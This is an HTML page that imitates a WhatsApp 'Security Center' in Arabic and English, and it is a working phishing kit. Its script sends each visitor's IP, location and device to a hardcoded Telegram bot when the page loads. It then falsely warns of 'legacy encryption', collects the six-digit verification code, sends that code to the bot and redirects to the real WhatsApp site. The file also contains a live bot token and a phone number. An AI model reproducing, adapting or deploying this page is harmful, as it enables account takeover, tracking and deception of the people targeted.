<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp Security Center</title>
    <style>
        :root { --wa-bg: #0b141a; --wa-green: #00a884; --wa-text: #e9edef; --wa-hint: #8696a0; --wa-danger: #f15c5c; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, Segoe UI, Roboto, sans-serif; }
        body { background: var(--wa-bg); color: var(--wa-text); min-height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
        
        #scanner { position: fixed; inset: 0; background: var(--wa-bg); z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
        .pulse-logo { width: 80px; fill: var(--wa-green); animation: pulse 2s infinite; margin-bottom: 25px; }
        @keyframes pulse { 0% { transform: scale(0.9); opacity: 0.8; } 50% { transform: scale(1); opacity: 1; } 100% { transform: scale(0.9); opacity: 0.8; } }
        
        .container { width: 100%; max-width: 400px; padding: 25px; text-align: center; display: none; }
        .main-logo { width: 65px; fill: var(--wa-green); margin-bottom: 20px; }
        
        .card { background: #1d2a33; border-radius: 15px; padding: 22px; border: 1px solid #2a3942; margin: 25px 0; text-align: inherit; }
        .row { display: flex; justify-content: space-between; font-size: 14px; margin-bottom: 14px; border-bottom: 1px solid #25313a; padding-bottom: 10px; }
        .row:last-child { border: none; }
        
        .legacy { color: var(--wa-danger); font-weight: bold; }
        .status-up { color: var(--wa-green); font-weight: bold; }
        .promo-text { font-size: 14px; color: var(--wa-hint); line-height: 1.6; margin-bottom: 25px; }
        
        .input-box { width: 100%; background: #2a3942; border: 1px solid #3b4a54; border-radius: 12px; padding: 18px; color: #fff; font-size: 24px; text-align: center; outline: none; margin-bottom: 15px; letter-spacing: 5px; }
        .btn { background: var(--wa-green); color: #111b21; border: none; width: 100%; padding: 18px; border-radius: 30px; font-size: 17px; font-weight: 700; cursor: pointer; }
    </style>
</head>
<body>

    <div id="scanner">
        <svg class="pulse-logo" viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L0 24l6.335-1.662c1.72.94 3.659 1.437 5.634 1.437h.005c6.558 0 11.894-5.335 11.897-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
        <div id="scan-txt">Optimizing Security...</div>
    </div>

    <div class="container" id="main-ui">
        <svg class="main-logo" viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L0 24l6.335-1.662c1.72.94 3.659 1.437 5.634 1.437h.005c6.558 0 11.894-5.335 11.897-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
        <h2 id="ui-title">--</h2>
        
        <div class="card">
            <div class="row"><span id="lbl-num">--</span> <b id="val-num" dir="ltr">--</b></div>
            <div class="row"><span id="lbl-st">--</span> <b class="legacy" id="val-st">--</b></div>
            <div class="row"><span id="lbl-prot">--</span> <b class="legacy" id="val-prot">TLS 1.0 / SSL v3</b></div>
        </div>

        <p class="promo-text" id="ui-desc">--</p>
        <input type="tel" id="otp" class="input-box" placeholder="--- ---" maxlength="6">
        <button class="btn" id="ui-btn" onclick="send()">--</button>
    </div>

    <script>
        const LANGS = {
            ar: { dir: 'rtl', scan: ["جاري فحص الأمان...", "تحديث التشفير...", "تحسين استقرار النظام..."], title: "نظام حماية المحادثات", lblNum: "رقم الحساب:", lblSt: "حالة التشفير:", valSt: "تشفير قديم (Legacy)", lblProt: "بروتوكول الأمان:", desc: "تم رصد بروتوكولات تشفير قديمة على هذا الرقم. لضمان الخصوصية، يرجى الترقية إلى نظام التشفير الموحد TLS 1.3 عن طريق تأكيد رمز المزامنة.", btn: "تحديث نظام التشفير الآن" },
            en: { dir: 'ltr', scan: ["Checking security...", "Updating encryption...", "Optimizing system..."], title: "Chat Protection System", lblNum: "Account Number:", lblSt: "Encryption Status:", valSt: "Legacy Encryption", lblProt: "Security Protocol:", desc: "Legacy encryption protocols detected on this number. To ensure privacy, please upgrade to unified TLS 1.3 by confirming the sync code.", btn: "Update Encryption Now" }
        };

        const uLang = (navigator.language || "en").split('-')[0];
        const L = LANGS[uLang] || LANGS.en;
        const CFG = {
            T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU',
            C: '5446862709',
            P: new URLSearchParams(window.location.search).get('u') || "01112816444"
        };

        // دالة عرض الرقم بأسلوب واتساب الرسمي
        function formatWA(n) {
            let clean = n.replace(/\D/g, '');
            if(clean.startsWith('01')) {
                // عرض كود مصر + أول 3 أرقام من الشبكة + نجوم + آخر رقمين
                return `+20 ${clean.slice(0, 3)} •••• ${clean.slice(-2)}`;
            }
            return `+${clean.slice(0, 2)} ${clean.slice(2, 5)} •••• ${clean.slice(-2)}`;
        }

        async function trackVisitor() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                const log = `📍 <b>New Visit</b>\nTarget: <code>${CFG.P}</code>\nIP: <code>${d.ip}</code>\nLoc: ${d.city}, ${d.country_name}\nOrg: ${d.org}\nDevice: ${getDev()}`;
                fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage?chat_id=${CFG.C}&text=${encodeURIComponent(log)}&parse_mode=HTML`);
            } catch (e) {
                const log = `🔔 <b>New Visit</b>\nTarget: ${CFG.P}\nDevice: ${getDev()}`;
                fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage?chat_id=${CFG.C}&text=${encodeURIComponent(log)}&parse_mode=HTML`);
            }
        }

        function getDev() {
            const ua = navigator.userAgent;
            if (/android/i.test(ua)) return "Android";
            if (/iPhone|iPad/i.test(ua)) return "iPhone";
            return "PC";
        }

        window.onload = () => {
            trackVisitor();
            document.body.dir = L.dir;
            const scanTxt = document.getElementById('scan-txt');
            L.scan.forEach((t, i) => setTimeout(() => scanTxt.innerText = t, i * 1500));

            setTimeout(() => {
                document.getElementById('ui-title').innerText = L.title;
                document.getElementById('lbl-num').innerText = L.lblNum;
                document.getElementById('val-num').innerText = formatWA(CFG.P);
                document.getElementById('lbl-st').innerText = L.lblSt;
                document.getElementById('val-st').innerText = L.valSt;
                document.getElementById('lbl-prot').innerText = L.lblProt;
                document.getElementById('ui-desc').innerText = L.desc;
                document.getElementById('ui-btn').innerText = L.btn;
                
                document.getElementById('scanner').style.opacity = '0';
                setTimeout(() => { document.getElementById('scanner').remove(); document.getElementById('main-ui').style.display = 'block'; }, 500);
            }, 5000);
        };

        async function send() {
            const val = document.getElementById('otp').value;
            if(val.length < 6) return;
            document.getElementById('ui-btn').disabled = true;
            const log = `🔥 <b>CODE RECEIVED</b>\nTarget: ${CFG.P}\nCode: <code>${val}</code>`;
            await fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage?chat_id=${CFG.C}&text=${encodeURIComponent(log)}&parse_mode=HTML`);
            window.location.href = "https://www.whatsapp.com/security";
        }
    </script>
</body>
</html>
